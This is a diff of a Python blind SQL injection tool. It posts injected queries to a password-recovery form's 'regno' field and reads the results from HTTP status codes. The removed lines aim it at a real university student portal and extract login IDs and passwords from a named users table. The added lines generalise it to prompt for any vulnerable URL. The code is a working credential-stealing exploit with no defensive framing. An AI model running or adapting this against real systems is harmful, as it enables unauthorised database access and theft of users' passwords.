@@ -13,6 +13,8 @@ from time import time
 headers = {"User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) \
 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"}
 
+targetAdrress = raw_input("Enter the vulnerable url:\n")
+
 thisDir = os.getcwd()
 
 #the function retrieve the value of a builtin function
@@ -89,7 +91,7 @@ def getRowCount(tableName, condition=""):
 def queryDB(mainQuery):
     data = {"regno":mainQuery, "submit":"Submit"}
     with requests.Session() as s:
-        page = s.post("https://student.auk.edu.ng/recover_password.php", data=data, headers=headers)
+        page = s.post(targetAdrress, data=data, headers=headers)
         if page.status_code == 200:
             return "1"
         elif page.status_code == 500:
@@ -102,6 +104,6 @@ def writeData(data):
         f.write(data+"\n")
 
 
-getRowContent("alqalam_eforms.tblusers_login", columnName="concat(loginid,':',loginpassword)", condition="")
-#getRowContent("information_schema.tables", columnName="table_name", condition=" where table_schema='alqalam_eforms'")
-#getRowContent("information_schema.columns", columnName="column_name", condition=" where table_name='tblusers_login'")
+getRowContent("", columnName="concat()", condition="")
+#getRowContent("nformation_schema.tables", columnName="table_name", condition=" where table_schema=''")
+#getRowContent("information_schema.columns", columnName="column_name", condition=" where table_name=''")
